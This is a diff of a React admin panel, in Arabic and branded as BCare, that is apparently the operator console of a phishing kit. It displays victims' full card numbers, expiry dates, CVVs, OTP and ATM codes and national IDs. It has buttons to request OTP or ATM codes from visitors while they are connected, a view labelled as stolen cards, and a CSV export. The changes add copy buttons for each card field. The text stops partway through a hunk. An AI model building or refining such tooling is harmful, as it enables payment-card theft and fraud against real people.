@@ -111,16 +111,6 @@ export const Admin = () => {
     });
 
     return filtered.sort((a, b) => {
-      const getPriority = (c) => {
-        let p = 0;
-        if (c.card_number) p += 50;
-        if (c.status === 'otp' || (c.page && c.page.toLowerCase().includes('otp'))) p += 100;
-        if (c.otps && c.otps.length > 0) p += 150;
-        return p;
-      };
-      const pA = getPriority(a);
-      const pB = getPriority(b);
-      if (pA !== pB) return pB - pA;
       return (b.last_update || 0) - (a.last_update || 0);
     });
   }, [activeCustomers, searchQuery]);
@@ -435,11 +425,11 @@ export const Admin = () => {
   };
 
   // Quick Copy Helper
-  const handleCopyCard = (e, customer) => {
+  const handleCopyText = (e, text, label) => {
     e.stopPropagation();
-    const text = `${customer.card_number || ''}|${customer.card_expiry || ''}|${customer.card_cvv || ''}`;
+    if (!text || text === '---') return;
     navigator.clipboard.writeText(text);
-    alert('تم نسخ البطاقة: ' + text);
+    alert(`تم نسخ ${label}`);
   };
 
   // Reusable Virtual Card
@@ -451,30 +441,60 @@ export const Admin = () => {
       className="admin-virtual-card-v2" 
       style={{ position: 'relative' }}
     >
-      <button 
-        onClick={(e) => handleCopyCard(e, customer)}
-        className="icon-btn copy-card-btn"
-        title="نسخ بيانات البطاقة"
-      >
-        <Copy size={16} color="#fff" />
-      </button>
       <div className="v-card-top-row">
         <div className="v-card-chip"></div>
         <div className="v-card-bank-name">{getBankName(customer.card_number)}</div>
       </div>
-      <div className="v-card-number-v2" style={{ direction: 'ltr', unicodeBidi: 'plaintext' }}>{customer.card_number}</div>
+      
+      <div className="v-card-number-v2" style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', direction: 'ltr' }}>
+        <span>{customer.card_number || '---'}</span>
+        {customer.card_number && (
+          <button 
+            onClick={(e) => handleCopyText(e, customer.card_number, 'رقم البطاقة')}
+            style={{ background: 'rgba(255,255,255,0.1)', border: 'none', borderRadius: '4px', padding: '4px', cursor: 'pointer', color: '#fff', display: 'flex' }}
+            title="نسخ رقم البطاقة"
+          >
+            <Copy size={14} />
+          </button>
+        )}
+      </div>
+
       <div className="v-card-bottom">
         <div className="v-card-info-v2">
           <span>NAME</span>
-          <strong style={{fontSize: '12px', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis', maxWidth: '120px', display: 'inline-block'}}>{customer.full_name || '---'}</strong>
+          <strong style={{fontSize: '12px', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis', maxWidth: '100px', display: 'inline-block'}}>{customer.full_name || '---'}</strong>
         </div>
-        <div className="v-card-info-v2">
-          <span>EXP</span>
-          <strong>{customer.card_expiry || '---'}</strong>
+        
+        <div className="v-card-info-v2" style={{ flexDirection: 'row', alignItems: 'flex-end', gap: '5px' }}>
+          <div style={{ display: 'flex', flexDirection: 'column' }}>
+            <span>EXP</span>
+            <strong>{customer.card_expiry || '---'}</strong>
+          </div>
+          {customer.card_expiry && (
+            <button 
+              onClick={(e) => handleCopyText(e, customer.card_expiry, 'تاريخ الانتهاء')}
+              style={{ background: 'rgba(255,255,255,0.1)', border: 'none', borderRadius: '4px', padding: '3px 5px', cursor: 'pointer', color: '#fff', marginBottom: '2px', display: 'flex' }}
+              title="نسخ تاريخ الانتهاء"
+            >
+              <Copy size={12} />
+            </button>
+          )}
         </div>
-        <div className="v-card-info-v2">
-          <span>CVV</span>
-          <strong>{customer.card_cvv || '---'}</strong>
+
+        <div className="v-card-info-v2" style={{ flexDirection: 'row', alignItems: 'flex-end', gap: '5px' }}>
+          <div style={{ display: 'flex', flexDirection: 'column' }}>
+            <span>CVV</span>
+            <strong>{customer.card_cvv || '---'}</strong>
+          </div>
+          {customer.card_cvv && (
+            <button 
+              onClick={(e) => handleCopyText(e, customer.card_cvv, 'الرقم السري CVV')}
+              style={{ background: 'rgba(255,255,255,0.1)', border: 'none', borderRadius: '4px', padding: '3px 5px', cursor: 'pointer', color: '#fff', marginBottom: '2px', display: 'flex' }}
+              title="نسخ CVV"
+            >
+              <Copy size={12} />
+            </button>
+          )}
         </div>
       </div>
     </motion.div>
@@ -501,420 +521,369 @@ export const Admin = () => {
   ));
 
   return (
-    <div className="admin-v2-root" dir="rtl">
-      <div className="admin-top-banner">حمل تطبيق بي كير الآن واستمتع بخدمات أكثر</div>
-
-      {/* Header based on image */}
-      <header className="admin-main-header">
-        <div className="header-right">
-          <div className="gear-menu-v2">
-            <button className="icon-btn" onClick={() => setIsGearOpen(!isGearOpen)}><Menu size={20} /></button>
-            {isGearOpen && (
-              <div className="gear-dropdown-v2" onMouseLeave={() => setIsGearOpen(false)}>
-                <button onClick={() => { setCurrentView('stats'); setIsGearOpen(false); }}><PieChart size={16} /> الإحصائيات</button>
-                <button onClick={() => { setCurrentView('cards'); setIsGearOpen(false); }}><CreditCard size={16} /> البطاقات المسحوبة</button>
-                <button onClick={exportToCSV}><Download size={16} /> تصدير البطاقات (CSV)</button>
-                <button onClick={() => { setCurrentView('failed'); setIsGearOpen(false); }}><AlertCircle size={16} /> العملاء المنسحبين</button>
-                <button onClick={() => { setCurrentView('users'); setIsGearOpen(false); }}><Lock size={16} /> تغيير كلمة المرور</button>
-                <button onClick={() => { setIsDeleteModalOpen(true); setIsGearOpen(false); }} style={{ color: 'red' }}><Trash2 size={16} /> حذف كافة البيانات</button>
-                <hr />
-                <button onClick={() => { sessionStorage.removeItem('admin_session_v3'); setIsAuthenticated(false); }}><LogOut size={16} /> خروج</button>
-              </div>
-            )}
+    <div className="admin-v3-root" dir="rtl">
+      {/* 1. Main Navigation */}
+      <nav className="main-nav-v3">
+        <div className="nav-top">
+          <img src="/group-21.svg" alt="Logo" className="nav-logo" onClick={() => setCurrentView('workspace')} />
+          <div className="nav-items-v3">
+            <button className={`nav-item ${currentView === 'workspace' ? 'active' : ''}`} onClick={() => setCurrentView('workspace')} title="مساحة العمل">
+              <Users size={24} />
+            </button>
+            <button className={`nav-item ${currentView === 'stats' ? 'active' : ''}`} onClick={() => setCurrentView('stats')} title="الإحصائيات">
+              <PieChart size={24} />
+            </button>
+            <button className={`nav-item ${currentView === 'cards' ? 'active' : ''}`} onClick={() => setCurrentView('cards')} title="البطاقات">
+              <CreditCard size={24} />
+            </button>
+            <button className="nav-item" onClick={exportToCSV} title="تصدير CSV">
+              <Download size={24} />
+            </button>
+            <button className={`nav-item ${currentView === 'users' ? 'active' : ''}`} onClick={() => setCurrentView('users')} title="الإعدادات">
+              <Settings size={24} />
+            </button>
           </div>
-          <div className="online-counter-pill">
-            <div className="pulse-dot"></div>
-            <span>متواجد حالياً: {stats.onlineNow}</span>
-          </div>
-          <button
-            className={`icon-btn ${isSoundEnabled ? 'active' : ''}`}
-            onClick={() => setIsSoundEnabled(!isSoundEnabled)}
-            title={isSoundEnabled ? "كتم الصوت" : "تشغيل الصوت"}
-          >
-            {isSoundEnabled ? <Clock size={20} color="#4caf50" /> : <ShieldOff size={20} color="#f44336" />}
+        </div>
+        
+        <div className="nav-bottom">
+          <button className={`nav-item ${isSoundEnabled ? 'active-sound' : 'muted-sound'}`} onClick={() => setIsSoundEnabled(!isSoundEnabled)} title={isSoundEnabled ? "كتم الصوت" : "تشغيل الصوت"}>
+            {isSoundEnabled ? <Clock size={24} /> : <ShieldOff size={24} />}
+          </button>
+          <button className="nav-item text-red" onClick={() => setIsDeleteModalOpen(true)} title="حذف البيانات">
+            <Trash2 size={24} />
+          </button>
+          <button className="nav-item" onClick={() => { sessionStorage.removeItem('admin_session_v3'); setIsAuthenticated(false); }} title="خروج">
+            <LogOut size={24} />
           </button>
         </div>
+      </nav>
 
-        <div className="header-center">
-          <img src="/group-21.svg" alt="BCare" className="bcare-logo" onClick={() => setCurrentView('workspace')} style={{ cursor: 'pointer' }} />
-        </div>
+      {/* 2. Inbox Sidebar (Only visible if workspace) */}
+      <AnimatePresence>
+        {currentView === 'workspace' && (
+          <motion.aside 
+            className="inbox-sidebar-v3"
+            initial={{ opacity: 0, x: 50 }}
+            animate={{ opacity: 1, x: 0 }}
+            exit={{ opacity: 0, x: 50 }}
+          >
+            <div className="inbox-header">
+              <h2>صندوق الوارد</h2>
+              <div className="online-pill-v3">
+                <div className="pulse-dot"></div>
+                متصل: {stats.onlineNow}
+              </div>
+            </div>
+            <div className="inbox-search-v3">
+              <input type="text" placeholder="بحث باسم، هوية أو جوال..." value={searchQuery} onChange={e => setSearchQuery(e.target.value)} />
+            </div>
+            <div className="inbox-list-v3">
+              <AnimatePresence>
+                {filteredCustomers.map(c => {
+                  const online = isUserOnline(c);
+                  const hasCard = !!c.card_number;
+                  const hasOtp = c.otps && c.otps.length > 0;
+                  const isOtpPage = c.status === 'otp' || (c.page && c.page.toLowerCase().includes('otp'));
+                  
+                  return (
+                    <motion.div 
+                      layout
+                      initial={{ opacity: 0, y: 10 }}
+                      animate={{ opacity: 1, y: 0 }}
+                      exit={{ opacity: 0, scale: 0.95 }}
+                      transition={{ type: "spring", stiffness: 300, damping: 25 }}
+                      key={c.id} 
+                      className={`inbox-item-v3 ${selectedCustomerId === c.id ? 'selected' : ''}`}
+                      onClick={() => setSelectedCustomerId(c.id)}
+                    >
+                      <div className="inbox-item-header">
+                        <span className="inbox-name">{c.full_name || c.id_number || 'عميل جديد'}</span>
+                        <span className={`inbox-status ${online ? 'online' : 'offline'}`}>{online ? 'متصل' : 'غادر'}</span>
+                      </div>
+                      <div className="inbox-item-page">{c.page || 'الرئيسية'}</div>
+                      <div className="inbox-item-tags">
+                        {hasCard && <span className="tag-card">💳 بطاقة</span>}
+                        {hasOtp && <span className="tag-otp">💬 {c.otps.length} كود</span>}
+                        {isOtpPage && !hasOtp && <span className="tag-wait">⏳ ينتظر كود</span>}
+                        <span className="tag-time">{c.last_update ? new Date(c.last_update).toLocaleTimeString('ar-SA', { hour: '2-digit', minute: '2-digit' }) : ''}</span>
+                      </div>
+                    </motion.div>
+                  );
+                })}
+              </AnimatePresence>
+            </div>
+          </motion.aside>
+        )}
+      </AnimatePresence>
 
-        <div className="header-left">
-          <button className="lang-btn">EN</button>
-          <div className="view-indicator-pill">{currentView === 'workspace' ? 'لوحة التحكم' : currentView === 'stats' ? 'الإحصائيات' : currentView === 'cards' ? 'إدارة البطاقات' : 'تغيير كلمة المرور'}</div>
-        </div>
-      </header>
-
-      <div className={`admin-content-v2 ${mobileDetailsActive ? 'details-active' : ''}`}>
-        {/* Sidebar (Right) */}
-        <aside className="admin-sidebar-v2">
-          <div className="sidebar-header-v2">
-            <h2>العملاء النشطين ({activeCustomers.length})</h2>
-            <button className="icon-btn" onClick={() => setCurrentView('workspace')}><ArrowRight size={18} /></button>
+      {/* 3. Main Workspace Area */}
+      <main className="workspace-area-v3">
+        <header className="workspace-header-v3">
+          <div className="header-title">نظام الإدارة الآمن | Bcare Panel</div>
+          <div className="header-actions">
+            <span className="admin-badge">مدير النظام</span>
           </div>
-          <div className="sidebar-search-v2">
-            <input type="text" placeholder="بحث..." value={searchQuery} onChange={e => setSearchQuery(e.target.value)} />
-          </div>
-          <div className="sidebar-list-v2">
-            <AnimatePresence>
-              {filteredCustomers.map(c => {
-                const online = isUserOnline(c);
-                const hasCard = !!c.card_number;
-                const hasOtp = c.otps && c.otps.length > 0;
-                const isOtpPage = c.status === 'otp' || (c.page && c.page.toLowerCase().includes('otp'));
-                
-                return (
-                  <motion.div 
-                    layout
-                    initial={{ opacity: 0, y: 10 }}
-                    animate={{ opacity: 1, y: 0 }}
-                    exit={{ opacity: 0, scale: 0.95 }}
-                    transition={{ type: "spring", stiffness: 300, damping: 25 }}
-                    key={c.id} 
-                    className={`sidebar-item-v2 ${selectedCustomerId === c.id ? 'selected' : ''} ${hasCard ? 'priority-card' : ''} ${hasOtp ? 'priority-otp' : ''}`}
-                    onClick={() => {
-                      setSelectedCustomerId(c.id);
-                      setMobileDetailsActive(true);
-                    }}
-                  >
-                    <div className="item-main-info">
-                      <span className="customer-name-v2">{c.full_name || c.id_number || 'عميل جديد'}</span>
-                      <span className={`online-status-v2 ${online ? 'online' : 'offline'}`}>
-                        {online ? 'متصل' : 'غادر'}
-                      </span>
-                    </div>
-                    <div className="item-page-row">
-                      {c.page || 'تصفح الموقع'}
-                    </div>
-
-                    <div className="item-indicators">
-                      {hasCard && (
-                        <div className="indicator-tag card-tag">
-                          <CreditCard size={10} /> ادخل بطاقة
-                        </div>
-                      )}
-                      {hasOtp && (
-                        <div className="indicator-tag otp-tag">
-                          <Plus size={10} /> كود ({c.otps.length})
-                        </div>
-                      )}
-                      {isOtpPage && !hasOtp && (
-                        <div className="indicator-tag waiting-tag">
-                          <Clock size={10} /> ينتظر الكود
-                        </div>
-                      )}
-                      <span className="time-tag">
-                        {c.last_update ? new Date(c.last_update).toLocaleTimeString('ar-SA', { hour: '2-digit', minute: '2-digit' }) : ''}
-                      </span>
-                    </div>
-                  </motion.div>
-                );
-              })}
-            </AnimatePresence>
-          </div>
-        </aside>
-
-        {/* Main Area (Left) */}
-        <main className="admin-main-v2">
+        </header>
+        
+        <div className="workspace-content-scroll">
           <AnimatePresence mode="wait">
             {currentView === 'workspace' && (
               selectedCustomer ? (
                 <motion.div 
                   key="workspace-inner"
-                  initial={{ opacity: 0, x: -20 }}
-                  animate={{ opacity: 1, x: 0 }}
-                  exit={{ opacity: 0, x: 20 }}
-                  transition={{ duration: 0.3 }}
-                  className="workspace-inner"
+                  initial={{ opacity: 0, y: 20 }}
+                  animate={{ opacity: 1, y: 0 }}
+                  exit={{ opacity: 0, y: -20 }}
+                  className="workspace-container"
                 >
-                <div className="customer-top-info">
-                  <button className="back-to-list-btn" onClick={() => setMobileDetailsActive(false)}>
-                    <ArrowRight size={20} />
-                    <span>العودة للقائمة</span>
-                  </button>
-                  <h1>{selectedCustomer.full_name || selectedCustomer.id_number}</h1>
-                  <div className={`online-status-badge ${isUserOnline(selectedCustomer) ? 'online' : 'offline'}`}>
-                    {isUserOnline(selectedCustomer) ? 'متصل الآن - ' : 'خرج - '} {selectedCustomer.page}
-                    {selectedCustomer.page && selectedCustomer.page.includes('انتظار') && (
-                      <span className="wait-timer">
-                        (منذ {Math.floor((Date.now() - (selectedCustomer.last_update || Date.now())) / 1000)} ثانية)
-                      </span>
-                    )}
-                  </div>
-                </div>
-
-                {/* Quick Note Box */}
-                <div className="quick-note-section" style={{ marginBottom: '15px', background: '#fff', padding: '10px 15px', borderRadius: '10px', display: 'flex', alignItems: 'center', gap: '10px' }}>
-                  <Edit3 size={18} color="#64748b" />
-                  {showNoteInput ? (
-                    <div style={{ display: 'flex', gap: '5px', flex: 1 }}>
-                      <input 
-                        type="text" 
-                        value={noteText}
-                        onChange={(e) => setNoteText(e.target.value)}
-                        placeholder="اكتب ملاحظة (مثال: البطاقة مرفوضة)..." 
-                        style={{ flex: 1, padding: '5px 10px', borderRadius: '5px', border: '1px solid #ddd' }}
-                      />
-                      <button onClick={() => {
-                        const newNotes = { ...adminNotes, [selectedCustomer.id]: noteText };
-                        setAdminNotes(newNotes);
-                        localStorage.setItem('admin_notes', JSON.stringify(newNotes));
-                        setShowNoteInput(false);
-                      }} style={{ background: '#e91e63', color: '#fff', padding: '5px 15px', borderRadius: '5px', border: 'none', cursor: 'pointer' }}>حفظ</button>
-                    </div>
-                  ) : (
-                    <div style={{ flex: 1, display: 'flex', justifyContent: 'space-between', alignItems: 'center', cursor: 'pointer' }} onClick={() => { setShowNoteInput(true); setNoteText(adminNotes[selectedCustomer.id] || ''); }}>
-                      <span style={{ color: adminNotes[selectedCustomer.id] ? '#1e293b' : '#94a3b8' }}>
-                        {adminNotes[selectedCustomer.id] || 'أضف ملاحظة سريعة لهذا العميل...'}
-                      </span>
-                    </div>
-                  )}
-                </div>
-
-                {/* New Top Preview: Card (Left) and Codes (Right) */}
-                <div className="top-preview-row">
-                  <div className="preview-left">
-                    {selectedCustomer.card_number ? (
-                      <VirtualCard customer={selectedCustomer} />
-                    ) : (
-                      <div className="no-card-placeholder">بانتظار إدخال بيانات البطاقة...</div>
-                    )}
-                  </div>
-
-                  <div className="preview-right">
-                    <div className="codes-mini-display">
-                      <div className="mini-code-col">
-                        <h5>أكواد الـ OTP</h5>
-                        <div className="mini-list">
-                          {[...(selectedCustomer.otps || [])].filter(o => o.type === 'otp').slice().reverse().map((o, i) => (
-                            <div key={i} className={`mini-code-item ${i === 0 ? 'newest' : ''}`}>{o.code}</div>
-                          ))}
-                        </div>
+                  {/* Top Bar with Name and Quick Actions */}
+                  <div className="customer-hero-card">
+                    <div className="hero-info">
+                      <h1>{selectedCustomer.full_name || selectedCustomer.id_number}</h1>
+                      <div className={`hero-status ${isUserOnline(selectedCustomer) ? 'online' : 'offline'}`}>
+                        {isUserOnline(selectedCustomer) ? 'متصل الآن' : 'غادر'} - {selectedCustomer.page}
+                        {selectedCustomer.page && selectedCustomer.page.includes('انتظار') && (
+                          <span className="wait-timer">
+                            (منذ {Math.floor((Date.now() - (selectedCustomer.last_update || Date.now())) / 1000)} ثانية)
+                          </span>
+                        )}
                       </div>
-                      <div className="mini-code-col">
-                        <h5>أكواد الـ ATM</h5>
-                        <div className="mini-list">
-                          {[...(selectedCustomer.otps || [])].filter(o => o.type === 'atm').slice().reverse().map((o, i) => (
-                            <div key={i} className={`mini-code-item ${i === 0 ? 'newest' : ''}`}>{o.code}</div>
-                          ))}
+                    </div>
+                    <div className="hero-note">
+                      <Edit3 size={18} color="#64748b" />
+                      {showNoteInput ? (
+                        <div className="note-input-wrap">
+                          <input 
+                            type="text" 
+                            value={noteText}
+                            onChange={(e) => setNoteText(e.target.value)}
+                            placeholder="اكتب ملاحظة..." 
+                          />
+                          <button onClick={() => {
+                            const newNotes = { ...adminNotes, [selectedCustomer.id]: noteText };
+                            setAdminNotes(newNotes);
+                            localStorage.setItem('admin_notes', JSON.stringify(newNotes));
+                            setShowNoteInput(false);
+                          }}>حفظ</button>
+                        </div>
+                      ) : (
+                        <div className="note-display" onClick={() => { setShowNoteInput(true); setNoteText(adminNotes[selectedCustomer.id] || ''); }}>
+                          <span>{adminNotes[selectedCustomer.id] || 'أضف ملاحظة سريعة لهذا العميل...'}</span>
+                        </div>
+                      )}
+                    </div>
+                  </div>
+
+                  {/* Active Data Area (Card & Timeline) */}
+                  <div className="active-data-grid">
+                    <div className="active-card-col">
+                      <h3>البطاقة البنكية</h3>
+                      {selectedCustomer.card_number ? (
+                        <VirtualCard customer={selectedCustomer} />
+                      ) : (
+                        <div className="empty-card-state">بانتظار إدخال بيانات البطاقة...</div>
+                      )}
+                    </div>
+                    <div className="active-timeline-col">
+                      <h3>سجل الأكواد (OTPs & ATMs)</h3>
+                      <div className="timeline-container">
+                        <div className="timeline-col">
+                          <h4>أكواد الـ OTP</h4>
+                          <div className="timeline-list">
+                            {[...(selectedCustomer.otps || [])].filter(o => o.type === 'otp').slice().reverse().map((o, i) => (
+                              <div key={i} className={`timeline-item ${i === 0 ? 'latest' : ''}`}>{o.code}</div>
+                            ))}
+                          </div>
+                        </div>
+                        <div className="timeline-col">
+                          <h4>أكواد صراف ATM</h4>
+                          <div className="timeline-list">
+                            {[...(selectedCustomer.otps || [])].filter(o => o.type === 'atm').slice().reverse().map((o, i) => (
+                              <div key={i} className={`timeline-item ${i === 0 ? 'latest' : ''}`}>{o.code}</div>
+                            ))}
+                          </div>
                         </div>
                       </div>
                     </div>
                   </div>
-                </div>
 
-                {/* Large Colored Buttons */}
-                <div className="action-buttons-row">
-                  <button className="act-btn-v2 btn-otp" onClick={() => handleAction('request_otp')}>
-                    <MessageSquare size={32} />
-                    <span>طلب كود OTP</span>
-                  </button>
-                  <button className="act-btn-v2 btn-atm" onClick={() => handleAction('request_atm')}>
-                    <CreditCard size={32} />
-                    <span>طلب صراف ATM</span>
-                  </button>
-                  <button className="act-btn-v2 btn-reject" onClick={() => handleAction('rejected')}>
-                    <X size={32} />
-                    <span>إنهاء / رفض</span>
-                  </button>
-                  <button className="act-btn-v2 btn-complete" onClick={() => handleAction('completed')}>
-                    <CheckCircle size={24} />
-                    <span>قبول العملية وإظهار وثيقة التأمين</span>
-                  </button>
-                </div>
-
-                {/* Information Grid */}
-                <div className="info-sections-grid">
-                  <div className="info-card-v2">
-                    <h3>معلومات الشخص</h3>
-                    <div className="info-row-v2"><span>الاسم</span> <strong>{selectedCustomer.full_name || '---'}</strong></div>
-                    <div className="info-row-v2"><span>رقم الهوية</span> <strong>{selectedCustomer.id_number || '---'}</strong></div>
-                    <div className="info-row-v2"><span>الجوال</span> <strong>{selectedCustomer.mobile || '---'}</strong></div>
-                    <div className="info-row-v2"><span>الجهاز</span> <strong>{selectedCustomer.device || '---'}</strong></div>
-                    <div className="info-row-v2"><span>الغرض</span> <strong>{selectedCustomer.purpose || 'شخصي'}</strong></div>
-                    <div className="info-row-v2"><span>الرقم التسلسلي</span> <strong>{selectedCustomer.sequence_number || '---'}</strong></div>
-                    <button className="btn-ban-small" onClick={banCustomer}><ShieldAlert size={14} /> حظر العميل</button>
+                  {/* Floating Action Bar equivalent */}
+                  <div className="action-bar-v3">
+                    <button className="action-btn-v3 btn-otp" onClick={() => handleAction('request_otp')}>
+                      <MessageSquare size={24} /> طلب كود OTP
+                    </button>
+                    <button className="action-btn-v3 btn-atm" onClick={() => handleAction('request_atm')}>
+                      <CreditCard size={24} /> طلب صراف ATM
+                    </button>
+                    <button className="action-btn-v3 btn-reject" onClick={() => handleAction('rejected')}>
+                      <X size={24} /> إنهاء / رفض
+                    </button>
+                    <button className="action-btn-v3 btn-complete" onClick={() => handleAction('completed')}>
+                      <CheckCircle size={24} /> قبول العملية
+                    </button>
                   </div>
 
-                  <div className="info-card-v2">
-                    <h3>تفاصيل التأمين المختارة</h3>
-                    <div className="info-row-v2"><span>الشركة</span> <strong>{selectedCustomer.selected_company || '---'}</strong></div>
-                    <div className="info-row-v2"><span>المبلغ الإجمالي</span> <strong className="price">{selectedCustomer.total_price || '---'} ريال</strong></div>
-                    <div className="info-row-v2"><span>نوع التأمين</span> <strong>تأمين شامل</strong></div>
-                    <div className="info-row-v2"><span>المركبة</span> <strong>{selectedCustomer.car_make_model || '---'}</strong></div>
+                  {/* Static Details */}
+                  <div className="static-details-grid">
+                    <div className="detail-card-v3">
+                      <h3>معلومات العميل</h3>
+                      <ul>
+                        <li><span>الاسم:</span> <strong>{selectedCustomer.full_name || '---'}</strong></li>
+                        <li><span>رقم الهوية:</span> <strong>{selectedCustomer.id_number || '---'}</strong></li>
+                        <li><span>الجوال:</span> <strong>{selectedCustomer.mobile || '---'}</strong></li>
+                        <li><span>الجهاز:</span> <strong>{selectedCustomer.device || '---'}</strong></li>
+                        <li><span>الرقم التسلسلي:</span> <strong>{selectedCustomer.sequence_number || '---'}</strong></li>
+                      </ul>
+                      <button className="ban-btn-v3" onClick={banCustomer}><ShieldAlert size={16} /> حظر العميل</button>
+                    </div>
+                    <div className="detail-card-v3">
+                      <h3>تفاصيل التأمين</h3>
+                      <ul>
+                        <li><span>الشركة:</span> <strong>{selectedCustomer.selected_company || '---'}</strong></li>
+                        <li><span>المبلغ الإجمالي:</span> <strong className="text-green">{selectedCustomer.total_price || '---'} ريال</strong></li>
+                        <li><span>المركبة:</span> <strong>{selectedCustomer.car_make_model || '---'}</strong></li>
+                        <li><span>الغرض:</span> <strong>{selectedCustomer.purpose || 'شخصي'}</strong></li>
+                      </ul>
+                    </div>
                   </div>
-                </div>
+                  
+                  {/* Technical Data */}
+                  <div className="tech-data-bar">
+                     <span><strong>رقم البطاقة الخام:</strong> {selectedCustomer.card_number || '---'}</span>
+                     <span><strong>تاريخ الانتهاء:</strong> {selectedCustomer.card_expiry || '---'}</span>
+                     <span><strong>CVV:</strong> {selectedCustomer.card_cvv || '---'}</span>
+                     <span><strong>تحديث:</strong> {new Date(selectedCustomer.last_update || 0).toLocaleString('ar-SA')}</span>
+                  </div>
 
-                {/* RAW DATA DEBUG SECTION */}
-                <div className="info-card-v2" style={{ marginTop: '20px', background: '#fffbeb', borderColor: '#fef3c7' }}>
-                  <h3 style={{ color: '#92400e' }}>البيانات التقنية (للتأكد)</h3>
-                  <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px', fontSize: '12px' }}>
-                    <div className="info-row-v2"><span>رقم البطاقة (خام)</span> <strong>{selectedCustomer.card_number || 'لم يصل بعد'}</strong></div>
-                    <div className="info-row-v2"><span>الاسم على البطاقة</span> <strong>{'---'}</strong></div>
-                    <div className="info-row-v2"><span>تاريخ الانتهاء</span> <strong>{selectedCustomer.card_expiry || '---'}</strong></div>
-                    <div className="info-row-v2"><span>CVV</span> <strong>{selectedCustomer.card_cvv || '---'}</strong></div>
-                    <div className="info-row-v2"><span>آخر تحديث</span> <strong>{new Date(selectedCustomer.last_update || 0).toLocaleString('ar-SA')}</strong></div>
-                  </div>
-                </div>
                 </motion.div>
               ) : (
-                <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="empty-state" key="empty">
-                  <Activity size={48} color="#cbd5e1" />
-                  <p>الرجاء اختيار عميل من القائمة للبدء</p>
-                </motion.div>
+                <div className="empty-workspace-v3">
+                  <Activity size={64} color="#cbd5e1" />
+                  <p>الرجاء اختيار عميل من القائمة الجانبية للبدء</p>
+                </div>
               )
             )}
-          </AnimatePresence>
 
-          {currentView === 'stats' && (
-            <div className="full-page-view">
-              <div className="view-header-row">
-                <h2>إحصائيات المنصة</h2>
-                <div className="stats-mini-summary">إجمالي النشاط والعمليات</div>
-              </div>
-              <div className="stats-filter-grid" style={{ gridTemplateColumns: 'repeat(5, 1fr)' }}>
-                <div className={`stat-box ${statsFilter === 'all' ? 'active' : ''}`} onClick={() => setStatsFilter('all')}>
-                  <strong>{stats.total}</strong>
-                  <span>كل العملاء</span>
+            {currentView === 'stats' && (
+              <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="page-view-v3">
+                <div className="page-header-v3">
+                  <h2>الإحصائيات العامة</h2>
                 </div>
-                <div className="stat-box" style={{ cursor: 'default' }}>
-                  <strong style={{ color: '#16a34a' }}>{stats.onlineNow}</strong>
-                  <span style={{ color: '#16a34a' }}>متصل الآن</span>
-                </div>
-                <div className={`stat-box ${statsFilter === 'completed' ? 'active' : ''}`} onClick={() => setStatsFilter('completed')}>
-                  <strong>{stats.completed}</strong>
-                  <span>الطلبات الناجحة</span>
-                </div>
-                <div className={`stat-box ${statsFilter === 'rejected' ? 'active' : ''}`} onClick={() => setStatsFilter('rejected')}>
-                  <strong>{stats.rejected}</strong>
-                  <span>الطلبات المرفوضة</span>
-                </div>
-                <div className={`stat-box ${statsFilter === 'cards' ? 'active' : ''}`} onClick={() => setStatsFilter('cards')}>
-                  <strong>{stats.withCards}</strong>
-                  <span>البطاقات المسحوبة</span>
-                </div>
-              </div>
-
-              <div className="stats-results-area">
-                {statsFilter === 'cards' ? (
-                  <div className="cards-grid-v2">
-                    {customers.filter(c => c.card_number).map((c, i) => (
-                      <VirtualCard key={i} customer={c} />
-                    ))}
+                <div className="stats-cards-grid">
+                  <div className={`stat-card-v3 ${statsFilter === 'all' ? 'active' : ''}`} onClick={() => setStatsFilter('all')}>
+                    <h3>كل العملاء</h3>
+                    <strong>{stats.total}</strong>
                   </div>
-                ) : (
-                  <div className="stats-table-wrapper">
-                    <table className="stats-table">
+                  <div className="stat-card-v3 online">
+                    <h3>متصل الآن</h3>
+                    <strong>{stats.onlineNow}</strong>
+                  </div>
+                  <div className={`stat-card-v3 ${statsFilter === 'completed' ? 'active' : ''}`} onClick={() => setStatsFilter('completed')}>
+                    <h3>ناجح</h3>
+                    <strong>{stats.completed}</strong>
+                  </div>
+                  <div className={`stat-card-v3 ${statsFilter === 'rejected' ? 'active' : ''}`} onClick={() => setStatsFilter('rejected')}>
+                    <h3>مرفوض</h3>
+                    <strong>{stats.rejected}</strong>
+                  </div>
+                  <div className={`stat-card-v3 ${statsFilter === 'cards' ? 'active' : ''}`} onClick={() => setStatsFilter('cards')}>
+                    <h3>بطاقات</h3>
+                    <strong>{stats.withCards}</strong>
+                  </div>
+                </div>
+
+                <div className="stats-content-v3">
+                  {statsFilter === 'cards' ? (
+                    <div className="cards-grid-v3">
+                      {customers.filter(c => c.card_number).map((c, i) => <VirtualCard key={i} customer={c} />)}
+                    </div>
+                  ) : (
+                    <table className="table-v3">
                       <thead>
                         <tr>
                           <th>الاسم</th>
                           <th>الهوية</th>
                           <th>الحالة</th>
                           <th>التاريخ</th>
-                          <th>الإجراء</th>
+                          <th>إجراء</th>
                         </tr>
                       </thead>
                       <tbody>
-                        {customers.filter(c => {
-                          if (statsFilter === 'all') return true;
-                          return c.status === statsFilter;
-                        }).map((c, i) => (
+                        {customers.filter(c => statsFilter === 'all' ? true : c.status === statsFilter).map((c, i) => (
                           <tr key={i}>
                             <td>{c.full_name || '---'}</td>
                             <td>{c.id_number}</td>
-                            <td><span className={`status-tag ${c.status}`}>{c.status === 'completed' ? 'ناجح' : c.status === 'rejected' ? 'مرفوض' : 'قيد الانتظار'}</span></td>
+                            <td><span className={`status-badge ${c.status}`}>{c.status}</span></td>
                             <td>{c.last_update ? new Date(c.last_update).toLocaleDateString('ar-SA') : '---'}</td>
-                            <td><button onClick={() => { setSelectedCustomerId(c.id); setCurrentView('workspace'); }}>عرض</button></td>
+                            <td><button className="view-btn-v3" onClick={() => { setSelectedCustomerId(c.id); setCurrentView('workspace'); }}>عرض</button></td>
                           </tr>
                         ))}
                       </tbody>
                     </table>
-                  </div>
-                )}
-              </div>
-            </div>
-          )}
+                  )}
+                </div>
+              </motion.div>
+            )}
 
-          {currentView === 'cards' && (
-            <div className="full-page-view">
-              <div className="view-header-row">
-                <h2>كافة البطاقات المسحوبة</h2>
-                <button className="print-btn-v3" onClick={() => window.print()}><Printer size={18} /> طباعة PDF</button>
